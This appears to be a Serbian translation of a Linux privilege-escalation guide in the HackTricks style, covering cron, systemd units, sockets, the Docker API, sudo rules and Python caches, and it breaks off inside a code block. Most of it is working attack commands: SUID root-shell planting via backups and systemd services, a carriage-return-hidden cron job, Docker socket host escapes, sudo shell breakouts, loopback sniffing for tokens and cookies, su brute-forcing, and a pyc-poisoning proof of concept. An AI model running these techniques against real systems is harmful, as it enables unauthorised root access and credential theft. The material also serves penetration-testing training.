Ako cron u vlasništvu root-a pokreće `pg_basebackup` (ili bilo koju rekurzivnu kopiju) nad direktorijumom baze podataka u koji možete da pišete, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root**, sa istim mode bitovima, u izlaznu lokaciju rezervne kopije.<sup>[[26]](#references)</sup>

Tipičan tok otkrivanja (kao DB korisnik sa niskim privilegijama):
- Koristite `pspy` da uočite root cron koji svakog minuta poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potvrdite da možete da pišete u izvorni klaster (npr. `/var/lib/postgresql/14/main`) i da odredište (`/opt/backups/current`) postaje u vlasništvu root-a nakon pokretanja zadatka.

Eksploatacija:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Ovo funkcioniše zato što `pg_basebackup` pri kopiranju klastera čuva bitove režima pristupa fajlovima; kada ga pokrene root, odredišni fajlovi nasleđuju **vlasništvo root-a + SUID/SGID koje je izabrao napadač**. Svaka slična privilegovana rutina za pravljenje rezervnih kopija/kopiranje koja čuva dozvole i upisuje u izvršnu lokaciju ranjiva je.

### Nevidljivi cron poslovi

Moguće je napraviti cronjob tako što se **posle komentara doda znak za povratak na početak reda** (bez znaka za novi red), a cron posao će raditi. Primer (obratite pažnju na znak za povratak na početak reda):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Da biste otkrili ovu vrstu prikrivenog unosa, pregledajte cron fajlove alatima koji prikazuju kontrolne znakove:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Servisi

### _.service_ datoteke u koje može da se piše

Proverite da li možete da pišete u neku `.service` datoteku. Ako možete, **mogli biste da je izmenite** tako da **pokreće** vaš **backdoor kada se** servis **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
Na primer, napravite svoj backdoor unutar .service datoteke pomoću **`ExecStart=/tmp/script.sh`**

### Binarne datoteke servisa u koje može da se piše

Imajte na umu da ako imate **dozvole za pisanje nad binarnim datotekama koje pokreću servisi**, možete da ih zamenite backdoor-ima, tako da će se backdoor-i pokrenuti kada se servisi ponovo pokrenu.

### systemd PATH - Relativne putanje

Možete da vidite PATH koji koristi **systemd** pomoću:

```bash
systemctl show-environment
```

Ako utvrdite da možete da **pišete** u bilo kom direktorijumu putanje, možda ćete moći da **eskalirate privilegije**. Potrebno je da potražite **relativne putanje koje se koriste u konfiguracionim datotekama servisa**, kao što su:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Zatim napravite **izvršnu datoteku** sa **istim imenom kao binarna datoteka sa relativnom putanjom** unutar systemd PATH direktorijuma u koji možete da pišete. Kada se od servisa zatraži da izvrši ranjivu radnju (**Start**, **Stop**, **Reload**), izvršiće se vaš **backdoor** (neprivilegovani korisnici obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit datoteke čiji se naziv završava sa `**.timer**` i koje upravljaju datotekama `**.service**` ili događajima. **Timers** se mogu koristiti kao alternativa za cron jer imaju ugrađenu podršku za kalendarske vremenske događaje i monotone vremenske događaje i mogu se izvršavati asinhrono.

Možete izlistati sve timers pomoću:

```bash
systemctl list-timers --all
```

### Tajmeri sa dozvolom za upis

Ako možete da izmenite tajmer, možete da ga naterate da izvršava postojeće jedinice systemd.unit (kao što su `.service` ili `.target`).

```bash
Unit=backdoor.service
```

U dokumentaciji možete pročitati šta je jedinica:

> Jedinica koja će se aktivirati kada istekne ovaj tajmer. Argument je naziv jedinice bez sufiksa „.timer“. Ako nije naveden, podrazumevana vrednost je servis koji ima isti naziv kao jedinica tajmera, ali bez sufiksa. (Pogledajte iznad.) Preporučuje se da naziv aktivirane jedinice i naziv jedinice tajmera budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, trebalo bi da:

- Pronađete neku systemd jedinicu (kao što je `.service`) koja **izvršava binarni fajl koji može da se menja**
- Pronađete neku systemd jedinicu koja **izvršava relativnu putanju** i imate **dozvole za pisanje nad systemd PATH** (kako biste se predstavili kao taj izvršni fajl)

**Saznajte više o tajmerima pomoću komande `man systemd.timer`.**

### **Omogućavanje tajmera**

Da biste omogućili tajmer, potrebne su vam root privilegije i treba da izvršite:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Imajte na umu da se **timer** **aktivira** kreiranjem simboličke veze ka njemu na putanji `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istoj ili različitim mašinama u okviru client-server modela. Za komunikaciju između računara koriste standardne Unix descriptor fajlove, a podešavaju se pomoću `.socket` fajlova.<sup>[[14]](#references)</sup>

Soketi se mogu konfigurisati pomoću `.socket` fajlova.

**Saznajte više o socketima pomoću komande `man systemd.socket`.** U ovom fajlu može se konfigurisati nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali se njihovom zbirnom vrednošću **označava gde će socket slušati** (putanja do AF_UNIX socket fajla, IPv4/6 adresa i/ili broj porta na kojem će slušati itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju pokreće se **instanca servisa** kojoj se prosleđuje samo socket te konekcije. Ako je **false**, sami listening socketi se **prosleđuju pokrenutoj service jedinici**, a za sve konekcije pokreće se samo jedna service jedinica. Ova vrednost se zanemaruje za datagram sockete i FIFO-e, gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevana vrednost je false**. Zbog performansi se preporučuje da se novi daemon-i pišu tako da budu kompatibilni samo sa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija koje se **izvršavaju pre** ili **posle** kreiranja i povezivanja listening **socketâ**/FIFO-a. Prvi token komandne linije mora biti apsolutna putanja do fajla, a zatim slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja listening **socketâ**/FIFO-a.
- `Service`: Navodi ime **service** jedinice koja će se **aktivirati** pri **dolaznom saobraćaju**. Ovo podešavanje je dozvoljeno samo za sockete sa `Accept=no`. Podrazumevano se koristi servis istog imena kao socket (sa zamenjenim sufiksom). U većini slučajeva ne bi trebalo da bude potrebno koristiti ovu opciju.

### Upisivi .socket fajlovi

Ako pronađete **upisiv** `.socket` fajl, možete **dodati** na početak odeljka `[Socket]` nešto poput: `ExecStartPre=/home/kali/sys/backdoor`, pa će se backdoor izvršiti pre kreiranja socketa. Zato ćete **verovatno morati da sačekate da se mašina ponovo pokrene.**\
_Imajte na umu da sistem mora da koristi konfiguraciju tog socket fajla, inače se backdoor neće izvršiti_

### Aktivacija socketa + upisiva putanja do jedinica (kreiranje nedostajućeg servisa)

Još jedna pogrešna konfiguracija sa ozbiljnim posledicama je:

- socket jedinica sa `Accept=no` i `Service=<name>.service`
- nedostaje referencirana service jedinica
- napadač može da upisuje u `/etc/systemd/system` (ili neku drugu putanju za pretragu jedinica)

U tom slučaju napadač može da kreira `<name>.service`, a zatim pokrene saobraćaj ka socketu, zbog čega će systemd učitati i izvršiti novi servis kao root.

Kratak tok:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Upisivi soketi

Ako **pronađete bilo koji upisivi soket** (_ovde govorimo o Unix soketima, a ne o konfiguracionim `.socket` fajlovima_), **možete da komunicirate** sa tim soketom i možda iskoristite ranjivost.

### Nabrajanje Unix soketa

```bash
netstat -a -p --unix
```

### Sirova veza

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Primer eksploatacije:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da možda postoje **sockets koji osluškuju HTTP** zahteve (_ne mislim na .socket fajlove, već na fajlove koji funkcionišu kao unix sockets_). Ovo možete proveriti pomoću:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ako **socket odgovori HTTP** zahtevom, možete da **komunicirate** s njim i možda **iskoristite neku ranjivost**.

### Docker socket koji može da se upisuje

Docker socket, koji se često nalazi na putanji `/var/run/docker.sock`, kritična je datoteka koju treba zaštititi. Podrazumevano, u nju mogu da upisuju korisnik `root` i članovi grupe `docker`. Pristup za upis u ovaj socket može da dovede do eskalacije privilegija. U nastavku je objašnjeno kako se to može uraditi i koje su alternativne metode ako Docker CLI nije dostupan.

#### **Eskalacija privilegija pomoću Docker CLI-ja**

Ako imate pristup za upis u Docker socket, možete da eskalirate privilegije pomoću sledećih komandi:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ove komande omogućavaju pokretanje kontejnera sa root pristupom fajl sistemu hosta.

#### **Direktno korišćenje Docker API-ja**

Ako Docker CLI nije dostupan, Docker socket se i dalje može zloupotrebiti korišćenjem sirovog HTTP-a preko Unix socketa. Najpouzdaniji postupak je:

- kreirati dugotrajni pomoćni kontejner sa root direktorijumom hosta montiranim kao bind mount
- pokrenuti ga
- kreirati `exec` instancu unutar tog pomoćnog kontejnera
- pokrenuti `exec` instancu i pročitati izlaz preko API-ja

**Izlistati Docker slike**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Kreirajte i pokrenite pomoćni kontejner**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Napravite exec instancu**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Pokrenite exec instancu i pročitajte izlaz**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ovaj obrazac je obično robusniji nego da pokušavate ručno da upravljate komandom `attach` pomoću `socat` ili `nc -U`. Kada možete da kreirate pomoćni kontejner sa `/:/host`, možete da koristite dodatne instance komande `exec` za čitanje datoteka kao što je `/host/root/...`, dodavanje SSH ključeva u `/host/root/.ssh` ili menjanje datoteka za pokretanje hosta.

### Ostalo

Imajte na umu da, ako imate dozvole za pisanje u docker socket zato što ste **član grupe `docker`**, imate [**više načina za eskalaciju privilegija**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API osluškuje na portu**, možda ćete moći i da ga kompromitujete](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina za izlazak iz kontejnera ili zloupotrebu okruženja za izvršavanje kontejnera radi eskalacije privilegija** na stranici:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacija privilegija pomoću Containerd-a (ctr)

Ako otkrijete da možete da koristite komandu **`ctr`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacija privilegija pomoću **RunC-a**

Ako otkrijete da možete da koristite komandu **`runc`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran **sistem za komunikaciju između procesa (IPC)** koji aplikacijama omogućava efikasnu interakciju i razmenu podataka. Osmišljen imajući u vidu savremene Linux sisteme, pruža robustan okvir za različite oblike komunikacije među aplikacijama.<sup>[[16]](#references)</sup>

Ovaj sistem je svestran i podržava osnovni IPC koji unapređuje razmenu podataka između procesa, slično **unapređenim UNIX domain socket-ima**. Osim toga, omogućava emitovanje događaja ili signala, čime se olakšava neometana integracija komponenti sistema. Na primer, signal Bluetooth daemon-a o dolaznom pozivu može da podstakne muzički plejer da utiša zvuk i tako poboljša korisničko iskustvo. D-Bus podržava i sistem udaljenih objekata, koji pojednostavljuje zahteve za uslugama i pozive metoda između aplikacija, čime se pojednostavljuju procesi koji su tradicionalno bili složeni.

D-Bus koristi **model dozvole/odbijanja**, koji upravlja dozvolama za poruke (pozive metoda, emitovanje signala itd.) na osnovu ukupnog dejstva podudarnih pravila smernica. Te smernice određuju interakcije sa magistralom i mogu omogućiti eskalaciju privilegija putem zloupotrebe tih dozvola.

U nastavku je prikazan primer takve smernice iz datoteke `/etc/dbus-1/system.d/wpa_supplicant.conf`, koja opisuje dozvole root korisnika da poseduje `fi.w1.wpa_supplicant1` i da mu šalje poruke, kao i da od njega prima poruke.

Smernice bez navedenog korisnika ili grupe primenjuju se univerzalno, dok se smernice konteksta „default“ primenjuju na sve slučajeve koji nisu obuhvaćeni drugim konkretnim smernicama.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Naučite kako da enumerišete i exploitujete D-Bus komunikaciju ovde:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Opšta enumeracija

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ako aktivan unos u `/etc/inetd.conf` pokreće GNU Inetutils `telnetd` kao root, proverite verziju podešenog binarnog fajla i lokalni listener, čak i kada je port vezan samo za loopback. GNU Inetutils verzije od 1.9.3 do 2.7 imale su [zaobilaženje telnet autentifikacije](https://seclists.org/oss-sec/2026/q1/89), pri kom je `USER` koji je dostavio klijent prosleđen komandi `login -f` (CVE-2026-24061). Proces ili string verzije samo su pokazatelji; proverite da li je dobavljač primenio zakrpu i koji se daemon zaista izvršava pre nego što ga smatrate ranjivim. Više detalja potražite u [Telnet vodiču](../../../network-services-pentesting/pentesting-telnet.md).

### Brza trijaža filtriranja odlaznog saobraćaja

Ako host može da izvršava komande, ali povratne veze ne uspevaju, brzo razdvojte filtriranje DNS-a, transporta, proxy-ja i ruta:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima niste mogli da komunicirate pre nego što ste joj pristupili:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasifikujte listenere prema bind target-u:

- `0.0.0.0` / `[::]`: dostupni na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: dostupni samo lokalno (dobri kandidati za tunnel/forward).
- Konkretne interne IP adrese (npr. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupne samo iz internih segmenata.

### Tok rada za trijažu servisa dostupnih samo lokalno

Kada kompromitujete host, servisi vezani za `127.0.0.1` često prvi put postaju dostupni iz vašeg shell-a. Brzi lokalni tok rada je:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kao mrežni skener (režim samo za mrežu)

Pored lokalnih PE provera, linPEAS može da radi kao namenski mrežni skener. Koristi dostupne binarne datoteke iz `$PATH` (obično `fping`, `ping`, `nc`, `ncat`) i ne instalira alate.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ako prosledite `-d`, `-p` ili `-i` bez `-t`, linPEAS se ponaša kao čisti mrežni skener (preskačući ostatak provera za eskalaciju privilegija).

### Sniffing

Proverite da li možete da sniffujete mrežni saobraćaj. Ako možete, možda ćete uspeti da prikupite neke kredencijale.

```
timeout 1 tcpdump
```

Brze praktične provere:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) je posebno vredan u post-exploitation fazi jer mnogi servisi dostupni samo interno tamo izlažu tokene/kolačiće/akreditive:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Prikupi sada, parsiraj kasnije:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Korisnici

### Opšta enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** postoje u sistemima, koji mogu da se **prijave** i koji imaju **root privilegije:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Veliki UID

Neke verzije Linuxa bile su pogođene greškom koja korisnicima sa **UID > INT_MAX** omogućava eskalaciju privilegija. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Iskoristite je** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi mogla da vam omogući root privilegije:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se u međuspremniku nalazi nešto zanimljivo (ako je moguće)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Politika lozinki

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Poznate lozinke

Ako **znate neku lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da napravite mnogo buke, a binarne datoteke `su` i `timeout` postoje na računaru, možete pokušati da brute-force-ujete korisnike pomoću alata [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da brute-force-uje korisnike.

## Zloupotreba $PATH sa dozvolom za upis

### $PATH

Ako utvrdite da možete **da pišete u neku fasciklu iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u fascikli u koju možete da pišete**, pod imenom komande koju će izvršiti drugi korisnik (idealno root), a koja se **ne učitava iz fascikle navedene pre vaše fascikle u $PATH**.

### SUDO i SUID

Možda vam je dozvoljeno da izvršite neku komandu pomoću sudo-a ili ona može imati suid bit. Proverite to pomoću:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Neke **neočekivane komande omogućavaju čitanje i/ili pisanje datoteka, pa čak i izvršavanje komande**.<sup>[[8]](#references)</sup> Na primer:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo konfiguracija može korisniku omogućiti da izvršava određene komande sa privilegijama drugog korisnika bez poznavanja lozinke.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

U ovom primeru korisnik demo može da pokreće vim kao root; sada je trivijalno dobiti shell dodavanjem SSH ključa u root direktorijum ili pozivanjem sh.

```
sudo vim -c '!sh'
```

### Bash poređenje bez navodnika u sudo skripti

U Bash-u je desna strana izraza `[[ "$protected" == $candidate ]]` obrazac. Ako root sudo skripta popunjava `candidate` iz datoteke koju kontroliše pozivalac, vrednost kao što je `prefix*` može da se podudari sa početkom zaštićenog niza. Različite putanje uspeha i greške mogu tada da otkriju prefix oracle. Stavite desnu stranu u navodnike (`[[ "$protected" == "$candidate" ]]`) kada je nameravano doslovno poređenje. Pre nego što poređenje bez navodnika smatrate iskoristivim, proverite stvarne sudo argumente, poreklo ulaza i vidljivo ponašanje grana. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) definiše ovo ponašanje obrazaca.

### PrusаSlicer projektne datoteke pod sudo-om

Neograničeno sudo ovlašćenje za pokretanje `prusaslicer` ili `prusa-slicer` sa root privilegijama zaslužuje proveru ako pozivalac može da izabere `.3mf` projekat koji će se obrađivati. Projekat može da sadrži skriptu za naknadnu obradu koja se pokreće pri izvozu G-code-a; posebno napravljeni projekti mogli su da izvrše komande u PrusaSlicer-u do verzije 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Pre nego što zaključite da je granica privilegija dostižna, proverite efektivno sudo pravilo, verziju binarne datoteke i zakrpe dobavljača, izvor projekta i da li se relevantna putanja izvoza zaista izvršava. Fiksni argument projekta ili efektivna NOEXEC политика могу променити исход. Само присуство slicer-а не доказује путању за ескалацију привилегија.

### SETENV

Ова директива омогућава кориснику да **постави променљиву окружења** док нешто извршава:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** i mogao je da učita proizvoljnu Python biblioteku dok se skripta izvršavala kao root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Trovanje upisivog `__pycache__` / `.pyc` fajla u Python importima dozvoljenim preko sudo-a

Ako **Python skripta dozvoljena preko sudo-a** uvozi modul čiji paketni direktorijum sadrži **upisiv `__pycache__`**, možda možete zameniti keširani `.pyc` i izvršiti kod kao privilegovani korisnik prilikom sledećeg importa.<sup>[[30]](#references)</sup>

- Zašto funkcioniše:
  - CPython čuva keš bajtkoda u `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter proverava **zaglavlje** (magic + metapodatke vremenske oznake/hash vrednosti povezane sa izvornim kodom), a zatim izvršava marshaled code object sačuvan iza tog zaglavlja.
  - Ako možete **da obrišete i ponovo napravite** keširanu datoteku zato što je direktorijum upisiv, možete zameniti `.pyc` fajl u vlasništvu root-a koji nije upisiv.
- Tipičan put:
  - `sudo -l` prikazuje Python skriptu ili omotač koji možete pokrenuti kao root.
  - Ta skripta uvozi lokalni modul iz `/opt/app/`, `/usr/local/lib/...` itd.
  - Direktorijum `__pycache__` uvezenog modula upisiv je za vašeg korisnika ili za sve korisnike.

Brza enumeracija:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ako možete da pregledate privilegovanu skriptu, utvrdite uvezene module i putanju keša:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Tok zloupotrebe:

1. Jednom pokrenite skriptu dozvoljenu preko sudo-a da bi Python napravio legitiman keš fajl ako već ne postoji.
2. Pročitajte prvih 16 bajtova iz legitimnog `.pyc` fajla i ponovo ih upotrebite u zatrovanom fajlu.
3. Kompajlirajte payload code object, primenite `marshal.dumps(...)` na njega, obrišite originalni keš fajl i ponovo ga napravite sa originalnim zaglavljem i svojim zlonamernim bytecode-om.
4. Ponovo pokrenite skriptu dozvoljenu preko sudo-a da bi import izvršio vaš payload kao root.

Važne napomene:

- Ponovna upotreba originalnog zaglavlja je ključna jer Python proverava metapodatke keša u odnosu na izvornu datoteku, a ne da li se telo bytecode-a zaista podudara sa izvornim kodom.
- Ovo je naročito korisno kada je izvorna datoteka u vlasništvu root-a i nije upisiva, ali jeste direktorijum koji je sadrži, `__pycache__`.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` sprečavaju Python da upisuje nove `.pyc` fajlove; **ne** sprečavaju ga da učita već postojeći, važeći keš koji je napadač zamenio. Ključno je da li korisnik sa nižim privilegijama može da zameni keš koji će privilegovani import prihvatiti. Python proverava metapodatke o vremenskoj oznaci/veličini ili hešu pre nego što učita keširani bytecode. Pogledajte [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) i [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimalni oblik proof-of-concept-а:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
